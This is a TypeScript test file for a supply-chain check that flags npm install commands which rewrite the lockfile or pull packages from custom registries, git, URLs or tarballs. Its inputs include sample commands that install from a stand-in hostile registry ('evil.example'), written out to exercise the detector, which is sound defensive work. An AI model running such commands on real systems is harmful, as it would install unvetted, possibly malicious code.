/**
 * CL-11 — JS install source & integrity, as a FACT.
 *
 * Suppressing lifecycle scripts stops code running AT install time. It does
 * nothing about WHERE the packages come from or WHETHER the resolution is
 * pinned. So a second fact is needed before an install may auto-allow:
 *
 *   - `npm ci` is DETERMINISTIC: it installs exactly the lockfile and fails if
 *     the lockfile is missing or out of sync with package.json. npm enforces
 *     that itself, so the `ci` verb IS the lockfile-integrity guarantee.
 *   - `npm install`/`i`/`add`/`update` RESOLVE new versions and rewrite the
 *     lockfile — a supply-chain decision, not a reproduction of a pinned one.
 *   - a custom `--registry`, an inline `npm_config_registry`, or a git/URL/
 *     tarball spec pulls code from somewhere the default registry did not vet.
 *
 * This module reports those from the command alone. It does NOT decide; the PDP
 * turns "not the deterministic, default-source subset" into `ask`.
 */
import { describe, expect, test } from "bun:test"
import { normalize } from "@abdo/normalizer"
import { assessInstallSource } from "../src/index"

const src = (command: string) => assessInstallSource(normalize(command, { shell: "bash" }).commands ?? [])

describe("CL-11.9 determinism: ci vs install", () => {
  test("`npm ci` is deterministic and mutates no lockfile", () => {
    const a = src("npm ci")
    expect(a.isInstall).toBe(true)
    expect(a.deterministic).toBe(true)
    expect(a.mutatesLockfile).toBe(false)
    expect(a.blockers).toEqual([])
  })

  test("`npm install`/`i`/`add`/`update` resolve and rewrite the lockfile", () => {
    for (const cmd of ["npm install", "npm i", "npm install lodash", "npm add react", "npm update"]) {
      const a = src(cmd)
      expect(a.isInstall).toBe(true)
      expect(a.deterministic).toBe(false)
      expect(a.mutatesLockfile).toBe(true)
      expect(a.blockers).toContain("resolves_and_mutates_lockfile")
    }
  })

  test("a non-install command is simply not an install", () => {
    const a = src("npm test")
    expect(a.isInstall).toBe(false)
    expect(a.blockers).toEqual([])
  })
})

describe("CL-11.10 source: registry / git / url / tarball", () => {
  test("an explicit --registry is a custom, unvetted source", () => {
    const a = src("npm ci --registry https://evil.example/")
    expect(a.customRegistry).toBe(true)
    expect(a.blockers).toContain("custom_registry")
  })

  test("an inline npm_config_registry is caught too", () => {
    const a = src("npm_config_registry=https://evil.example/ npm ci")
    expect(a.customRegistry).toBe(true)
    expect(a.blockers).toContain("custom_registry")
  })

  test("a git / url / tarball / shorthand spec is a non-registry source", () => {
    for (const cmd of [
      "npm install git+https://github.com/x/y.git",
      "npm install https://example.com/pkg.tgz",
      "npm i user/repo",
      "npm install github:user/repo",
      "npm i file:../local",
    ]) {
      const a = src(cmd)
      expect(a.nonRegistrySource).toBe(true)
      expect(a.blockers).toContain("non_registry_source")
    }
  })

  test("a plain package name is NOT a non-registry source", () => {
    expect(src("npm install lodash").nonRegistrySource).toBe(false)
    expect(src("npm install @scope/pkg@^1.2.3").nonRegistrySource).toBe(false)
  })
})

describe("CL-11.11 offline / frozen is recorded as a preferred signal", () => {
  test("--offline / --prefer-offline / --frozen-lockfile are noted", () => {
    expect(src("npm ci --offline").offline).toBe(true)
    expect(src("npm ci --prefer-offline").offline).toBe(true)
    expect(src("npm ci --frozen-lockfile").offline).toBe(true)
    expect(src("npm ci").offline).toBe(false)
  })
})

describe("CL-11.12 the deterministic default-source subset is the ONLY clean one", () => {
  test("`npm ci` with no exotic source clears every blocker", () => {
    expect(src("npm ci").blockers).toEqual([])
    expect(src("npm ci --offline").blockers).toEqual([])
  })

  test("everything else names WHY it is not clean", () => {
    expect(src("npm install").blockers).toContain("resolves_and_mutates_lockfile")
    expect(src("npm ci --registry http://x/").blockers).toContain("custom_registry")
    expect(src("npm install git+https://x/y.git").blockers.length).toBeGreaterThan(0)
  })

  test("worst-wins across a chain: one dirty install dirties the whole", () => {
    const a = src("npm ci && npm install lodash")
    expect(a.blockers).toContain("resolves_and_mutates_lockfile")
  })
})
